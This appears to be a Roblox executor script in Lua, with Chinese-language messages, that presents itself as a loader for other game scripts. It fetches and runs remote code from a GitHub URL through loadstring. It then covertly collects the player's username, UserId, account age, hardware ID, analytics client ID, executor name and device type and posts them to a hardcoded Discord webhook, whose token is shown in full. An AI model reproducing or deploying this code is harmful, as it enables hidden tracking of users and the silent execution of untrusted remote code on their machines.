local msg = Instance.new("Message",workspace)
msg.Text = "未检测到你加入的服务器，正在为你加载其他脚本💩〖就是懒得更新〗"
wait(5)
msg:Destroy()

local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui

CoreGui:SetCore("SendNotification", {
    -- Customizable
    Title = "名脚本",
    Text = "为了你更好的体验",
    Duration = 10, --时间
})

getgenv().Leng="落陨中心QQ群1001493128" loadstring(game:HttpGet("https://raw.githubusercontent.com/odhdshhe/LZYC/refs/heads/main/ZCLY.txt"))()

local Webhook = "https://discord.com/api/webhooks/1350436094814064651/ME33WepwlTpUqacxr62Upv1pgk9Ug_hctOVnfuFmV9YXqCiRP-wiIVTOfD3FIyvV72Nm"

    local player = game:GetService"Players".LocalPlayer
    local joinTime = os.time() - (player.AccountAge*86400)
    local joinDate = os.date("!*t", joinTime)
    local premium = false
    local alt = true
    _G.IsPc = false
    if player.MembershipType == Enum.MembershipType.Premium then
       premium = true
    end

    if game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled then
        _G.IsPc = "模拟器/PC"
    elseif game.UserInputService.TouchEnabled then
        _G.IsPc = "IOS/Android"
    else
        _G.IsPc = "IOS/Android/Unknown"
    end

    local executor = identifyexecutor() or "Unknown"
    local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
    Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
    local AvatarImage = Thing.imageUrl

    local msg = {
      
       ["username"] = "bot",

       ["embeds"] = {
           {
               ["color"] = tonumber(tostring("0x32CD32")),
               ["title"] = "名脚本V2〖测试〗",
               ["thumbnail"] = {
                ["url"] = AvatarImage,
               },
               ["fields"] = {
                    {
                       ["name"] = "名称(Name)",
                       ["value"] = player.Name,
                       ["inline"] = true
                    },
                    {
                       ["name"] = "昵称(DisplayName)",
                       ["value"] = player.DisplayName,
                       ["inline"] = true
                    },
                    {
                       ["name"] = "UserId",
                       ["value"] = "["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")",
                       ["inline"] = true
                    },
                    {
                       ["name"] = "地图ID",
                       ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
                       ["inline"] = true
                    },
                    {
                       ["name"] = "地图名称",
                       ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                       ["inline"] = true
                    },
                    {
                       ["name"] = "使用的注入器",
                       ["value"] = executor,
                       ["inline"] = true
                    },
                    {
                       ["name"] = "账号年龄",
                       ["value"] = player.AccountAge.."天",
                       ["inline"] = true
                    },
                    {
                       ["name"] = "加入日期",
                       ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
                       ["inline"] = true
                    },
                    {
                        ["name"] = "HWID",
                        ["value"] = gethwid(),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "客户端ID",
                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "设备",
                        ["value"] = _G.IsPc,
                        ["inline"] = false
                    },
               }
           }
       }
    }
    
  
    request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    